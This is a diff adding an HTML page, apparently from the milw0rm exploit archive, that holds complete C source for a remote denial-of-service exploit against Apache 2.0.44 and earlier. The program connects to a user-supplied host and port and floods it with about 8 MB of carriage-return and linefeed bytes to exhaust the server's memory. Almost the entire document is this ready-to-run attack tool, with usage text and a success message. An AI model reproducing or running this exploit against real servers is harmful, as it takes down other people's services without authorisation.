@@ -1,0 +1,105 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+/******** th-apachedos.c ********************************************************
+* *
+* Remote Apache DoS exploit *
+* ------------------------- *
+* Written as a poc for the: *
+* 
+* This program sends 8000000 \n's to exploit the Apache memory leak. *
+* Works from scratch under Linux, as opposed to apache-massacre.c . *
+* 
+* 
+* Daniel Nyström &lt;exce@netwinder.nu&gt; *
+* 
+* - www.telhack.tk - *
+* 
+******************************************************** th-apachedos.c ********/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;sys/socket.h&gt;
+
+
+int main(int argc, char *argv[])
+{
+int sockfd;
+int count;
+char buffer[8000000];
+struct sockaddr_in target;
+struct hostent *he;
+
+if (argc != 3)
+{
+fprintf(stderr, &quot;\nTH-apachedos.c - Apache &lt;= 2.0.44 DoS exploit.&quot;);
+fprintf(stderr, &quot;\n----------------------------------------------&quot;);
+fprintf(stderr, &quot;\nUsage: %s &lt;Target&gt; &lt;Port&gt;\n\n&quot;, argv[0]);
+exit(-1);
+}
+
+printf(&quot;\nTH-Apache DoS\n&quot;);
+printf(&quot;-------------\n&quot;);
+printf(&quot;-&gt; Starting...\n&quot;); 
+printf(&quot;-&gt;\n&quot;);
+
+// memset(buffer, '\n', sizeof(buffer)); /* testing */
+
+for (count = 0; count &lt; 8000000;) 
+{
+buffer[count] = '\r'; /* 0x0D */
+count++;
+buffer[count] = '\n'; /* 0x0A */
+count++;
+}
+
+if ((he=gethostbyname(argv[1])) == NULL)
+{
+herror(&quot;gethostbyname() failed &quot;);
+exit(-1);
+}
+
+memset(&amp;target, 0, sizeof(target));
+target.sin_family = AF_INET;
+target.sin_port = htons(atoi(argv[2]));
+target.sin_addr = *((struct in_addr *)he-&gt;h_addr);
+
+printf(&quot;-&gt; Connecting to %s:%d...\n&quot;, inet_ntoa(target.sin_addr), atoi(argv[2]));
+printf(&quot;-&gt;\n&quot;);
+
+if ((sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0)
+{
+perror(&quot;socket() failed &quot;);
+exit(-1);
+}
+
+if (connect(sockfd, (struct sockaddr *)&amp;target, sizeof(struct sockaddr)) &lt; 0)
+{
+perror(&quot;connect() failed &quot;);
+exit(-1);
+}
+
+printf(&quot;-&gt; Connected to %s:%d... Sending linefeeds...\n&quot;, inet_ntoa(target.sin_addr),
+atoi(argv[2]));
+printf(&quot;-&gt;\n&quot;);
+
+if (send(sockfd, buffer, strlen(buffer), 0) != strlen(buffer))
+{
+perror(&quot;send() failed &quot;);
+exit(-1);
+close(sockfd);
+} 
+
+
+close(sockfd);
+
+printf(&quot;-&gt; Finished smoothly, check hosts apache...\n\n&quot;);
+}</pre>
+//downloaded from milw0rm.com
+</html>
